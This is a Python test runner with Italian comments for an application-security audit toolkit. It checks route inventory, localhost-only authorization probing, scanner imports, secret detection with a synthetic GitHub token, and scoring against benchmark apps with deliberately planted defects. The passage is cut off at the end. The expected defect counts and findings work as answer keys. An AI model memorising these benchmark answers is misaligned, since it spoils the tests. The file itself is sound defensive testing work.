#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Samuele Cucurnia e Pietro Previtali
"""Collaudo automatico degli script contro l'app di prova con difetti noti.

Uso:  python3 tests/run_checks.py
Verifica che gli script trovino ciò che deve trovare (difetti noti), non inventino altro, rispettino i limiti di sicurezza
(host non locali rifiutati, segreti mai stampati) e producano i PDF in tutte le modalità. Esce con 1 al primo fallimento.
"""
import csv
import json
import re
import subprocess
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SC = ROOT / "scripts"
FX = ROOT / "tests" / "fixtures"
APP = FX / "vuln-app"
EXP = json.loads((APP / "expected.json").read_text(encoding="utf-8"))
ok = fail = 0


def run(script, *args, expect=0):
    r = subprocess.run([sys.executable, str(SC / script), *map(str, args)], capture_output=True, text=True)
    return r


def check(name, cond, detail=""):
    global ok, fail
    if cond:
        ok += 1; print(f"  ok   {name}")
    else:
        fail += 1; print(f"  FAIL {name} {detail}")


def have(s):
    return (SC / s).exists()


tmp = Path(tempfile.mkdtemp())
# i manifest delle app di prova sono salvati come *.bench (versioni vulnerabili apposta: così Dependabot non li segnala);
# i collaudi usano una copia con i nomi veri
import shutil as _sh
_sh.copytree(FX / "vuln-app", tmp / "vuln-app")
for _b in (tmp / "vuln-app").rglob("*.bench"):
    _b.rename(_b.with_suffix(""))
APP = tmp / "vuln-app"
print("appsec-sentinel / gdpr-sentinel: collaudo script")

if have("inventory_routes.py"):
    r = run("inventory_routes.py", APP, "--out", tmp / "ep.csv")
    rows = list(csv.DictReader((tmp / "ep.csv").open(encoding="utf-8")))
    noauth = sorted(x["endpoint"] for x in rows if x["identita"] == "NESSUNA AUTH EVIDENTE")
    check("inventario: numero di route", len(rows) == EXP["route_totali"], f"{len(rows)}")
    check("inventario: route senza auth evidente", noauth == EXP["senza_auth_evidente"], str(noauth))
    check("inventario: la route con auth inline non è segnalata", "/api/products" not in noauth)
    run("inventory_routes.py", FX / "express-prefix", "--out", tmp / "xp.csv")
    xp = {(x["endpoint"], x["metodo"]): x["identita"] for x in csv.DictReader((tmp / "xp.csv").open(encoding="utf-8"))}
    check("inventario Express: auth dichiarata su un prefisso a monte riconosciuta", "a monte" in xp.get(("/api/basket/:id", "GET"), ""), str(xp.get(("/api/basket/:id", "GET"))))
    check("inventario Express: isAuthorized inline riconosciuto", xp.get(("/api/orders/:id", "GET"), "").startswith("autenticato"))
    check("inventario Express: middleware con nome isLoggedIn riconosciuto", xp.get(("/api/me", "GET"), "").startswith("autenticato"))
    check("inventario Express: route senza auth restano segnalate (/api/login, /metrics)", xp.get(("/api/login", "POST")) == "NESSUNA AUTH EVIDENTE" and xp.get(("/metrics", "GET")) == "NESSUNA AUTH EVIDENTE")
    check("inventario Express: app.use di montaggio (/ftp) elencato, il solo middleware globale no", ("/ftp", "ANY") in xp and not any(k[0] == "/" for k in xp))
    check("inventario Express: codice in cartelle di test escluso", not any("solo-test" in k[0] for k in xp))
    run("inventory_routes.py", FX / "multi-fw", "--out", tmp / "mf.csv")
    mf = {(x["endpoint"], x["metodo"]): x["identita"] for x in csv.DictReader((tmp / "mf.csv").open(encoding="utf-8"))}
    open_ = "NESSUNA AUTH EVIDENTE"
    check("inventario multi-framework: 14 route (Laravel, Spring, ASP.NET, Rails, Go)", len(mf) == 14, str(len(mf)))
    check("inventario Laravel: route senza middleware segnalata, con auth no", mf.get(("/health", "GET")) == open_ and mf.get(("/orders", "POST")) != open_)
    check("inventario Spring: @PreAuthorize riconosciuto", mf.get(("/api/users/{id}", "GET")) == open_ and mf.get(("/api/users/{id}", "DELETE")) != open_)
    check("inventario ASP.NET: [Authorize] riconosciuto", mf.get(("/api/reports/export", "GET")) == open_ and mf.get(("/api/reports/purge", "POST")) != open_)
    check("inventario Rails: before_action authenticate_user! del controller", mf.get(("/status", "GET")) == open_ and mf.get(("/invoices", "GET")) != open_)
    check("inventario Go: route con middleware di auth riconosciuta", mf.get(("/ping", "GET")) == open_ and mf.get(("/admin/reset", "POST")) != open_)

if have("dynamic_authz_check.py") and (FX.parent / "lab" / "lab_app.py").exists():
    # collaudo end-to-end su un'istanza locale reale (laboratorio con 2 difetti di autorizzazione noti, 4 comportamenti corretti)
    import socket, os, time
    _s = socket.socket(); _s.bind(("127.0.0.1", 0)); _port = _s.getsockname()[1]; _s.close()
    _srv = subprocess.Popen([sys.executable, str(FX.parent / "lab" / "lab_app.py"), str(_port)])
    try:
        for _ in range(30):
            try:
                socket.create_connection(("127.0.0.1", _port), 0.2).close(); break
            except OSError:
                time.sleep(0.1)
        lcfg = tmp / "lab.json"
        lcfg.write_text(json.dumps({"base_url": f"http://127.0.0.1:{_port}", "delay_ms": 0, "identities": {
            "anonimo": {}, "utente_a": {"headers": {"Authorization": "env:LAB_TOK_A"}}, "utente_b": {"headers": {"Authorization": "env:LAB_TOK_B"}}}}))
        lt = tmp / "lab.csv"
        lt.write_text("endpoint,metodo,identita,atteso,finding_id\n/api/health,GET,anonimo,200,\n/api/me,GET,anonimo,401,\n"
                      "/api/orders/1,GET,anonimo,401,\n/api/orders/1,GET,utente_b,403|404,F1\n/api/admin/users,GET,utente_a,403,F2\n/api/admin/audit,GET,utente_a,403,\n")
        os.environ.update(LAB_TOK_A="Bearer tok-a", LAB_TOK_B="Bearer tok-b")
        r = run("dynamic_authz_check.py", "--config", lcfg, "--tests", lt, "--out", tmp / "lab-res.csv")
        diff = [l for l in r.stdout.splitlines() if "DIFFORME" in l]
        check("istanza locale: trova il BOLA noto (ordine di un altro utente)", any("/api/orders/1" in l and "utente_b" in l for l in diff), r.stdout)
        check("istanza locale: trova il BFLA noto (admin raggiungibile da utente)", any("/api/admin/users" in l for l in diff))
        check("istanza locale: nessun falso positivo sui 4 comportamenti corretti", len(diff) == 2, str(len(diff)))
        check("istanza locale: tutte le 6 richieste eseguite", "richieste eseguite: 6/6" in r.stdout)
        em = tmp / "lab-matrix.csv"
        em.write_text("endpoint,metodo,fonte_scoperta,identita,ruolo,tenant,oggetto,azione,controllo_atteso,test_eseguito,esito,finding_id\n"
                      "/api/orders/:id,GET,codice,,,,,,,no,,\n/api/admin/users,GET,codice,,,,,,,no,,\n", encoding="utf-8")
        run("dynamic_authz_check.py", "--config", lcfg, "--tests", lt, "--out", tmp / "lab-res2.csv", "--update-matrix", em)
        emr = {r_["endpoint"]: r_ for r_ in csv.DictReader(em.open(encoding="utf-8"))}
        check("istanza locale: la matrice abbina /api/orders/1 a /api/orders/:id e tiene tutte le identità",
              emr["/api/orders/:id"]["test_eseguito"] == "si" and "anonimo" in emr["/api/orders/:id"]["esito"] and "utente_b" in emr["/api/orders/:id"]["esito"],
              str(emr["/api/orders/:id"]))
    finally:
        _srv.kill()

if have("dynamic_authz_check.py"):
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200 if self.path == "/open" else 401); self.end_headers(); self.wfile.write(b"x")
        def log_message(self, *a):
            pass
    srv = HTTPServer(("127.0.0.1", 0), H); threading.Thread(target=srv.serve_forever, daemon=True).start()
    cfg = tmp / "c.json"; cfg.write_text(json.dumps({"base_url": f"http://127.0.0.1:{srv.server_port}", "identities": {"anonimo": {}}, "delay_ms": 0}))
    t = tmp / "t.csv"; t.write_text("endpoint,metodo,identita,atteso,finding_id\n/open,GET,anonimo,401|403,X\n/closed,GET,anonimo,401,\n/x,POST,anonimo,401,\n")
    r = run("dynamic_authz_check.py", "--config", cfg, "--tests", t, "--out", tmp / "res.csv")
    res = list(csv.DictReader((tmp / "res.csv").open(encoding="utf-8")))
    check("test dinamici: rileva l'accesso inatteso", r.returncode == 2 and "DIFFORME" in r.stdout)
    check("test dinamici: metodo con effetti di stato saltato", res[2]["eseguito"] == "no")
    bad = tmp / "bad.json"; bad.write_text(json.dumps({"base_url": "https://example.com", "identities": {"anonimo": {}}}))
    r = run("dynamic_authz_check.py", "--config", bad, "--tests", t)
    check("test dinamici: host non locale rifiutato", r.returncode == 1 and "RIFIUTATO" in (r.stdout + r.stderr))
    srv.shutdown()

if have("import_scanner.py"):
    r = run("import_scanner.py", "--npm-audit", FX / "scanner/npm-audit.json", "--gitleaks", FX / "scanner/gitleaks.json", "--out", tmp / "cand.json")
    cand = json.loads((tmp / "cand.json").read_text(encoding="utf-8"))
    check("import: 3 candidati", len(cand) == 3, str(len(cand)))
    check("import: sempre ipotesi e mai oltre media", all(c["stato"] == "ipotesi da validare" and c["severita"] in ("media", "bassa", "informativa") for c in cand))
    check("import: il valore del segreto non compare", "VALORE-DI-PROVA" not in (tmp / "cand.json").read_text(encoding="utf-8") + r.stdout)
    v = run("validate_findings.py", tmp / "cand.json")
    check("import: i candidati superano la validazione", v.returncode == 0, v.stdout[-200:])
    r2 = run("import_scanner.py", "--npm-audit", FX / "scanner/npm-audit.json", "--merge", tmp / "cand.json", "--out", tmp / "cand2.json")
    check("import: nessun duplicato con --merge", len(json.loads((tmp / "cand2.json").read_text(encoding="utf-8"))) == 3)
    r3 = run("import_scanner.py", "--semgrep", FX / "scanner/semgrep.json", "--trivy", FX / "scanner/trivy.json", "--zap", FX / "scanner/zap.json", "--out", tmp / "cand3.json")
    txt3 = (tmp / "cand3.json").read_text(encoding="utf-8")
    c3 = json.loads(txt3)
    check("import semgrep/trivy/zap: 6 candidati", len(c3) == 6, str(len(c3)))
    check("import semgrep/trivy/zap: ipotesi, mai oltre media", all(c["stato"] == "ipotesi da validare" and c["severita"] in ("media", "bassa", "informativa") for c in c3))
    check("import semgrep/trivy/zap: nessun segreto/evidence/attack nell'output", not any(s in txt3 + r3.stdout for s in ("VALORE-DI-PROVA-TRIVY", "EVIDENZA-DI-PROVA-ZAP", "ATTACCO-DI-PROVA")))
    check("import semgrep/trivy/zap: superano la validazione", run("validate_findings.py", tmp / "cand3.json").returncode == 0)

if have("i18n.py"):
    la = tmp / "lang-audit"; run("init_audit.py", la)
    en = run("check_delivery.py", la, "--lang", "en")
    it = run("check_delivery.py", la)
    check("lingua: check_delivery --lang en stampa in inglese", "Delivery check" in en.stdout and "result:" in en.stdout and "Controllo di consegna" not in en.stdout, en.stdout[:200])
    check("lingua: senza --lang resta in italiano", "Controllo di consegna" in it.stdout and "esito:" in it.stdout)
    check("lingua: l'esito (codice di uscita) non cambia con la lingua", en.returncode == it.returncode)
    cs = run("coverage_summary.py", la, "--lang", "en")
    check("lingua: coverage_summary in inglese", "Coverage summary" in cs.stdout and "Counts cover only" in cs.stdout)
    badf = tmp / "bad-find.json"; badf.write_text(json.dumps([{"id": "F-1"}]))
    ve = run("validate_findings.py", badf, "--lang", "en")
    check("lingua: validate_findings in inglese, stesso esito", "ERROR " in ve.stdout and "ERRORE" not in ve.stdout and "errors ·" in ve.stdout and ve.returncode == run("validate_findings.py", badf).returncode, ve.stdout[:200])

if have("validate_findings.py"):
    import subprocess as _sp
    ex = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))
    ex[0]["prova"]["test_eseguito"] = "lettura integrale"; ex[0]["smentita"]["esito"] = "confermato"; ex[0]["prova"]["tipo"] = "lettura di codice"
    badj = tmp / "bad-enum.json"; badj.write_text(json.dumps(ex), encoding="utf-8")
    code = "import sys,runpy; sys.modules['jsonschema']=None; sys.argv=['v',%r]; runpy.run_path(%r, run_name='__main__')" % (str(badj), str(SC / "validate_findings.py"))
    rr = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, cwd=str(SC))
    check("validazione senza jsonschema: rifiuta enum e tipi annidati sbagliati", rr.returncode == 1 and "smentita/esito" in rr.stdout and "prova/tipo" in rr.stdout and "prova/test_eseguito" in rr.stdout, rr.stdout[-300:] + rr.stderr[-200:])

if have("run_scanners.py"):
    import os, stat, subprocess as sp
    rs = tmp / "rs-repo"; rs.mkdir()
    (rs / "package-lock.json").write_text('{"lockfileVersion":3}', encoding="utf-8")   # niente node_modules: deve funzionare lo stesso
    fake = tmp / "fakebin"; fake.mkdir()
    okb = fake / "npm"; okb.write_text("#!/bin/sh\ncat " + str(FX / "scanner/npm-audit.json") + "\nexit 1\n"); okb.chmod(okb.stat().st_mode | stat.S_IEXEC)
    env = dict(os.environ, PATH=str(fake) + os.pathsep + os.environ["PATH"])
    o1 = tmp / "sca1"
    r = sp.run([sys.executable, str(SC / "run_scanners.py"), "deps", str(rs), "--out", str(o1)], capture_output=True, text=True, env=env)
    st = json.loads((o1 / "sca-stato.json").read_text(encoding="utf-8")); cd = json.loads((o1 / "candidati-sca.json").read_text(encoding="utf-8"))
    check("scanner deps: npm audit sul solo lockfile (senza node_modules), esce con 1 per le vulnerabilità ma è «eseguito»", st[0]["esito"] == "eseguito" and len(cd) >= 1, r.stdout + r.stderr)
    check("scanner deps: candidati sempre ipotesi e validi", all(c["stato"] == "ipotesi da validare" for c in cd) and run("validate_findings.py", o1 / "candidati-sca.json").returncode == 0)
    bad = fake / "npm"; bad.write_text("#!/bin/sh\necho 'npm error network' >&2\nexit 1\n")
    o2 = tmp / "sca2"
    r2 = sp.run([sys.executable, str(SC / "run_scanners.py"), "deps", str(rs), "--out", str(o2)], capture_output=True, text=True, env=env)
    st2 = json.loads((o2 / "sca-stato.json").read_text(encoding="utf-8"))
    check("scanner deps: se npm fallisce è «non eseguito» con comando preparato e avviso", st2[0]["esito"] == "non eseguito" and "npm audit" in st2[0]["comando_preparato"] and "NON è stata eseguita" in r2.stdout, r2.stdout)
    o3 = tmp / "sca3"
    sp.run([sys.executable, str(SC / "run_scanners.py"), "deps", str(rs), "--out", str(o3), "--no-network"], capture_output=True, text=True, env=env)
    check("scanner deps: --no-network non esegue nulla e lo registra", json.loads((o3 / "sca-stato.json").read_text(encoding="utf-8"))[0]["motivo"].startswith("rete non consentita"))
    gr = tmp / "git-repo"; gr.mkdir()
    secret = "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"
    g = lambda *x: sp.run(["git", "-C", str(gr), "-c", "user.email=t@example.test", "-c", "user.name=t", *x], capture_output=True, text=True)
    g("init", "-q"); (gr / "cfg.js").write_text(f'const t = "{secret}"\n', encoding="utf-8"); g("add", "."); g("commit", "-qm", "a")
    (gr / "cfg.js").write_text("const t = process.env.T\n", encoding="utf-8"); g("commit", "-qam", "b")
    o4 = tmp / "hist"
    r4 = sp.run([sys.executable, str(SC / "run_scanners.py"), "history", str(gr), "--out", str(o4)], capture_output=True, text=True, env=dict(env, PATH=str(fake) + os.pathsep + "/usr/bin:/bin"))
    ch = json.loads((o4 / "candidati-history.json").read_text(encoding="utf-8"))
    allout = r4.stdout + r4.stderr + (o4 / "candidati-history.json").read_text(encoding="utf-8") + (o4 / "history-stato.json").read_text(encoding="utf-8")
    check("scanner history: trova un segreto rimosso dal codice ma presente nella storia", len(ch) == 1 and "cfg.js" in ch[0]["asset"] and "solo nella storia" in ch[0]["titolo"] and ch[0]["severita"] == "media", r4.stdout + r4.stderr)
    check("scanner history: il valore del segreto non compare mai", secret not in allout and "a1B2c3D4" not in allout)
    bench = subprocess.run([sys.executable, str(ROOT / "tests" / "benchmark" / "secrets_bench.py"), "--json"], capture_output=True, text=True)
    bj = json.loads(bench.stdout) if bench.stdout.strip().startswith("{") else {}
    check("segreti: banco sintetico, tutti i veri in cima", bj.get("veri_in_cima") == bj.get("veri_totali") and bj.get("veri_totali", 0) >= 10, bench.stdout[-300:] + bench.stderr[-300:])
    check("segreti: banco sintetico, nessuna esca in cima (segnaposto, seed, snippet shell, CSS, sudoers)", bj.get("esche_in_cima") == 0, str(bj.get("esche_in_cima_elenco")))
    check("segreti: nessun valore trapelato nell'output", bj.get("valori_trapelati") is False)

if have("check_delivery.py"):
    ma = tmp / "aud-min"; (ma / "findings").mkdir(parents=True)
    (ma / "findings" / "findings.json").write_text("[]", encoding="utf-8")
    (ma / "coverage-matrix.csv").write_text("area_o_percorso,tipo,modalita_verifica,esaminato,motivo_esclusione,note\nsrc/app.ts,file,lettura,si,,\n", encoding="utf-8")
    r = run("check_delivery.py", ma)
    check("consegna: registro senza dipendenze né segreti segnalato", "aree minime" in r.stdout and "dipendenze, segreti" in r.stdout and "manca" in r.stdout, r.stdout[-300:])
    (ma / "coverage-matrix.csv").write_text("area_o_percorso,tipo,modalita_verifica,esaminato,motivo_esclusione,note\npackage-lock.json,file,npm audit,no,non eseguito: rete,\nstoria git,repo,gitleaks,no,non eseguito,\n", encoding="utf-8")
    check("consegna: dipendenze e segreti presenti (anche «non eseguito») bastano", "ok   aree minime" in run("check_delivery.py", ma).stdout)

if have("verify_findings.py"):
    exs = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))[0]
    fs = json.loads(json.dumps(exs)); fs.update(id="APP-009", titolo="File .env versionato con segreti", severita="alta", cwe=["CWE-798"])
    fs.pop("smentita", None)
    sj = tmp / "sec.json"; sj.write_text(json.dumps([fs]), encoding="utf-8")
    run("verify_findings.py", sj, "--brief-dir", tmp / "briefs")
    br = (tmp / "briefs" / "smentita-APP-009.md").read_text(encoding="utf-8") if (tmp / "briefs" / "smentita-APP-009.md").exists() else ""
    check("smentita: per i segreti chiede se il valore è un segnaposto", "segnaposto" in br and "CHANGE_ME" in br, br[-300:])

if (ROOT / "tests" / "bench-app" / "score_bench.py").exists():
    SB = ROOT / "tests" / "bench-app" / "score_bench.py"
    truth = json.loads((ROOT / "tests" / "bench-app" / "truth.json").read_text(encoding="utf-8"))
    bdir = tmp / "bench"; bdir.mkdir()
    rp = subprocess.run([sys.executable, str(SB), "prepare", str(bdir)], capture_output=True, text=True)
    app = bdir / "bench-app"
    check("banco: prepare crea l'app con storia Git e senza la verità", app.exists() and not (app / "truth.json").exists() and (app / ".git").exists()
          and "__SESSION_SECRET__" not in (app / "docker-compose.yml").read_text(encoding="utf-8"), rp.stdout + rp.stderr)
    hint = [str(p.relative_to(app)) for p in app.rglob("*") if p.is_file() and ".git" not in p.parts
            and re.search(r"(?i)vulnerab|insecure|\bbug\b|flaw|difetto|fixme|todo", p.read_text(encoding="utf-8", errors="replace"))]
    check("banco: nessun commento che indichi i difetti", not hint, str(hint))
    exf = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))[0]
    def bf(i, t, sev="alta"):
        f = json.loads(json.dumps(exf)); f.update(id=f"APP-{i:03d}", titolo=t["titolo"], severita=sev, categoria="test", osservato=t["titolo"])
        f["prova"]["riferimenti_file"] = [t["file"][0] + ":1"]; f["prova"]["descrizione"] = t["titolo"]; f.pop("smentita", None)
        return f
    perfect = [bf(i, t) for i, t in enumerate(truth["difetti"], 1)]
    bad = perfect[:7] + [bf(90, truth["esche"][1], "alta")]
    for name, data in (("perfetto", perfect), ("scarso", bad)):
        d = tmp / f"bench-{name}" / "findings"; d.mkdir(parents=True); (d / "findings.json").write_text(json.dumps(data), encoding="utf-8")
    rs = subprocess.run([sys.executable, str(SB), "score", str(tmp / "bench-perfetto"), str(tmp / "bench-scarso")], capture_output=True, text=True)
    check("banco: audit perfetto 16/16, alti 6/6, nessun falso allarme", "difetti trovati: 16/16 · alti: 6/6 · falsi allarmi sulle esche: 0/5" in rs.stdout, rs.stdout[:400])
    check("banco: audit scarso 7/16 con il falso allarme su .env.staging", "difetti trovati: 7/16" in rs.stdout and "falso allarme D02" in rs.stdout, rs.stdout[-600:])
    def sf(i, ref, title):
        f = json.loads(json.dumps(exf)); f.update(id=f"SEC-{i:03d}", titolo=title, severita="media", cwe=["CWE-798"]); f["prova"]["riferimenti_file"] = [ref]; f.pop("smentita", None)
        return f
    sline = next(n for n, l in enumerate((app / "docker-compose.yml").read_text(encoding="utf-8").splitlines(), 1) if "SESSION_SECRET" in l)
    sj2 = tmp / "seg.json"; sj2.write_text(json.dumps([sf(1, ".env.staging:1-4", "Credenziali di staging nel file .env versionato"),
                                                        sf(2, f"docker-compose.yml:{sline}", "Segreto di firma delle sessioni nel compose")]), encoding="utf-8")
    vr = run("verify_findings.py", sj2, "--repo", app)
    check("revisore: segnala il finding sui segreti che cita solo segnaposto", "SEC-001: i valori alle righe citate sembrano segnaposto" in vr.stdout, vr.stdout[-400:])
    check("revisore: non segnala il segreto vero (valore casuale)", "SEC-002: i valori" not in vr.stdout, vr.stdout[-400:])
    check("banco: tabella difetto × giro e accordo", "accordo sui difetti noti: 7/16" in rs.stdout, rs.stdout[-300:])

for bname, noauth_atteso in (("bench-php", {"/health", "/internal/demo-seed", "/login", "/quotes/{id}"}),
                             ("bench-django", {"/health/", "/login/"})):
    if not (ROOT / "tests" / bname / "score_bench.py").exists():
        continue
    SBx = ROOT / "tests" / bname / "score_bench.py"
    tx = json.loads((ROOT / "tests" / bname / "truth.json").read_text(encoding="utf-8"))
    bx = tmp / bname; bx.mkdir()
    rp = subprocess.run([sys.executable, str(SBx), "prepare", str(bx)], capture_output=True, text=True)
    appx = bx / "bench-app"
    left = [str(p.relative_to(appx)) for p in appx.rglob("*") if p.is_file() and ".git" not in p.parts
            and re.search(r"__[A-Z_]{4,}__", p.read_text(encoding="utf-8", errors="replace"))]
    check(f"{bname}: prepare crea l'app con storia Git, senza verità e senza segnaposto", appx.exists() and (appx / ".git").exists()
          and not (appx / "truth.json").exists() and not left, rp.stdout + rp.stderr + str(left))
    hint = [str(p.relative_to(appx)) for p in appx.rglob("*") if p.is_file() and ".git" not in p.parts
            and re.search(r"(?i)vulnerab|insecure|\bbug\b|flaw|difetto|fixme|todo", p.read_text(encoding="utf-8", errors="replace"))]
    check(f"{bname}: nessun commento che indichi i difetti", not hint, str(hint))
    inv = tmp / f"{bname}-inv.csv"
    run("inventory_routes.py", appx, "--out", inv)
    na = {r["endpoint"] for r in csv.DictReader(inv.open(encoding="utf-8")) if r["identita"] == "NESSUNA AUTH EVIDENTE"}
    check(f"{bname}: inventario, route senza autenticazione esattamente quelle attese", na == noauth_atteso, str(sorted(na)))
    pa = tmp / f"{bname}-audit"
    run("init_audit.py", pa); run("prepass.py", appx, "--audit", pa, "--no-network")
    pp = (pa / "registro-tool" / "punti-pericolosi.txt").read_text(encoding="utf-8") if (pa / "registro-tool" / "punti-pericolosi.txt").exists() else ""
    atteso = "soci/views.py:53" if bname == "bench-django" else "resources/views/auth/login.blade.php:8"
    check(f"{bname}: prepass elenca i punti pericolosi (deserializzazione / HTML senza escape)", atteso in pp, pp[:300])
    exb = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))[0]
    def bfx(i, t):
        f = json.loads(json.dumps(exb)); f.update(id=f"APP-{i:03d}", titolo=t["titolo"], severita="alta", categoria="test", osservato=t["titolo"])
        f["prova"]["riferimenti_file"] = [t["file"][0] + ":1"]; f["prova"]["descrizione"] = t["titolo"]; f.pop("smentita", None)
        return f
    d = tmp / f"{bname}-perfetto" / "findings"; d.mkdir(parents=True)
    (d / "findings.json").write_text(json.dumps([bfx(i, t) for i, t in enumerate(tx["difetti"], 1)]), encoding="utf-8")
    rs = subprocess.run([sys.executable, str(SBx), "score", str(tmp / f"{bname}-perfetto")], capture_output=True, text=True)
    n, a = len(tx["difetti"]), sum(1 for t in tx["difetti"] if t["alto"])
    check(f"{bname}: audit perfetto {n}/{n}, alti {a}/{a}, nessun falso allarme",
          f"difetti trovati: {n}/{n} · alti: {a}/{a} · falsi allarmi sulle esche: 0/{len(tx['esche'])}" in rs.stdout, rs.stdout[:500] + rs.stderr[-300:])

if (ROOT / "tests" / "bench-juice" / "juice_bench.py").exists():
    import base64 as _b64, zlib as _z
    jt = tmp / "jtruth.bin"
    jt.write_bytes(_b64.b64encode(_z.compress(json.dumps({"commit": "x", "truth": {"loginAdmin": {"routes/login.ts": [34]}, "loginJim": {"routes/login.ts": [34]},
                                                                                    "dbSchema": {"routes/search.ts": [23]}}}).encode())))
    ja = tmp / "jaudit" / "findings"; ja.mkdir(parents=True)
    exj = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))[0]
    fj1 = json.loads(json.dumps(exj)); fj1["id"] = "APP-001"; fj1["prova"]["riferimenti_file"] = ["routes/login.ts:32-36"]
    fj2 = json.loads(json.dumps(exj)); fj2["id"] = "APP-002"; fj2["prova"]["riferimenti_file"] = ["routes/search.ts:80"]
    (ja / "findings.json").write_text(json.dumps([fj1, fj2]), encoding="utf-8")
    js = subprocess.run([sys.executable, str(ROOT / "tests" / "bench-juice" / "juice_bench.py"), "score", str(jt), str(tmp / "jaudit")], capture_output=True, text=True)
    check("banco Juice Shop: punteggio per file e riga (riga lontana non conta) e per posizione distinta", "2/3 (posizioni distinte: 1/2)" in js.stdout, js.stdout + js.stderr)

if have("merge_audits.py"):
    ex = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))[0]
    def mk(fid, titolo, ref, cwe, sev="media"):
        f = json.loads(json.dumps(ex)); f.update(id=fid, titolo=titolo, severita=sev, cwe=cwe); f["prova"]["riferimenti_file"] = [ref]
        f.update(asset=ref.split(":")[0], categoria=titolo.split()[0], osservato=titolo)   # contenuto proprio, come nei finding reali
        f["smentita"] = {"esito": "non eseguita", "verificatore": "nessuno", "tentativi": []}
        return f
    g1, g2 = tmp / "giro1", tmp / "giro2"
    for g in (g1, g2):
        (g / "findings").mkdir(parents=True)
    (g1 / "findings" / "findings.json").write_text(json.dumps([
        mk("APP-001", "Azioni GitHub non fissate a un commit", ".github/workflows/ci.yml:49", ["CWE-829"], "bassa"),
        mk("APP-002", "IP del client da X-Forwarded-For falsificabile", "src/lib/ip.ts:10", ["CWE-348"]),
        mk("APP-003", "Manuali serviti senza autenticazione", "src/app/api/manuals/route.ts:12", ["CWE-200"])]), encoding="utf-8")
    (g2 / "findings" / "findings.json").write_text(json.dumps([
        mk("APP-001", "Socket di fail2ban scrivibile dal container", "docker-compose.yml:205", ["CWE-250"]),   # stesso ID, causa diversa
        mk("APP-002", "Workflow con azioni di terzi non fissate", ".github/workflows/ci.yml:52", ["CWE-829"], "media")]), encoding="utf-8")
    r = run("merge_audits.py", g1, g2, "--out", tmp / "unione")
    u = json.loads((tmp / "unione" / "unione-giri.json").read_text(encoding="utf-8"))
    check("unione: 4 cause distinte, 1 vista da entrambi, accordo 25%", u["cause_distinte"] == 4 and u["viste_da_tutti"] == 1 and u["accordo"] == 0.25, r.stdout)
    check("unione: lo stesso ID con contenuto diverso NON viene unito", not any(g["visto_in"] == ["G1 APP-001", "G2 APP-001"] for g in u["gruppi"]))
    check("unione: severità discordanti segnalate, non mediate", any(g["severita"] == ["media", "bassa"] for g in u["gruppi"]))
    # catena: G1-X cita a.ts:10 e b.ts:50; G2-Y cita a.ts:10; G2-Z cita b.ts:50 → X può unirsi a uno solo dei due (Y e Z sono dello stesso giro)
    g3, g4 = tmp / "giro3", tmp / "giro4"
    for g in (g3, g4):
        (g / "findings").mkdir(parents=True)
    fx = mk("APP-001", "Permessi admin al ruolo responsabile", "src/lib/auth.ts:247", ["CWE-269"]); fx["prova"]["riferimenti_file"] = ["src/lib/auth.ts:247", "src/lib/ip.ts:50"]
    (g3 / "findings" / "findings.json").write_text(json.dumps([fx]), encoding="utf-8")
    (g4 / "findings" / "findings.json").write_text(json.dumps([
        mk("APP-001", "Permessi admin al ruolo responsabile senza gerarchia", "src/lib/auth.ts:247", ["CWE-269"]),
        mk("APP-002", "IP del client da header falsificabile", "src/lib/ip.ts:50", ["CWE-348"])]), encoding="utf-8")
    run("merge_audits.py", g3, g4, "--out", tmp / "unione-catena")
    uc = json.loads((tmp / "unione-catena" / "unione-giri.json").read_text(encoding="utf-8"))
    check("unione: niente catene, due finding dello stesso giro mai nello stesso gruppo", uc["cause_distinte"] == 2 and all(len({v.split()[0] for v in g["visto_in"]}) == len(g["visto_in"]) for g in uc["gruppi"]), json.dumps(uc["gruppi"])[:300])
    check("unione: elenco unito valido per lo schema", run("validate_findings.py", tmp / "unione" / "findings" / "findings.json").returncode == 0)
    r2 = run("merge_audits.py", g1, g2, "--out", tmp / "unione2")
    try:
        import reportlab  # noqa: F401
        (tmp / "unione" / "meta.json").write_text(json.dumps({"titolo": "Prova"}), encoding="utf-8")
        rp = run("build_report_pdf.py", tmp / "unione", "--out", tmp / "unione.pdf")
        import shutil as _sh2
        txt = subprocess.run(["pdftotext", str(tmp / "unione.pdf"), "-"], capture_output=True, text=True).stdout if _sh2.which("pdftotext") else "Due giri indipendenti"
        check("PDF del doppio: sezione «Due giri indipendenti» con l'accordo", rp.returncode == 0 and "Due giri indipendenti" in txt, rp.stdout + rp.stderr)
    except ImportError:
        pass
    check("unione: deterministica", (tmp / "unione" / "findings" / "findings.json").read_text(encoding="utf-8") == (tmp / "unione2" / "findings" / "findings.json").read_text(encoding="utf-8"))

if have("prepass.py"):
    pr = tmp / "pp-repo"; pr.mkdir()
    (pr / "server.js").write_text("const app = require('express')();\napp.get('/api/health', (q, r) => r.send('ok'));\napp.post('/api/internal/seed-demo', (q, r) => r.send('x'));\napp.get('/api/tickets/:id', requireAuth, (q, r) => r.send('t'));\napp.patch('/api/users/:id', requireAuth, (q, r) => r.send('u'));\n", encoding="utf-8")
    (pr / "Dockerfile").write_text("FROM node:latest\n", encoding="utf-8")
    (pr / "package-lock.json").write_text('{"lockfileVersion":3}', encoding="utf-8")
    pa1, pa2 = tmp / "pp-a1", tmp / "pp-a2"
    run("init_audit.py", pa1); run("init_audit.py", pa2)
    r = run("prepass.py", pr, "--audit", pa1, "--no-network"); run("prepass.py", pr, "--audit", pa2, "--no-network")
    cl = {x["id"]: x for x in csv.DictReader((pa1 / "checklist-rapido.csv").open(encoding="utf-8"))}
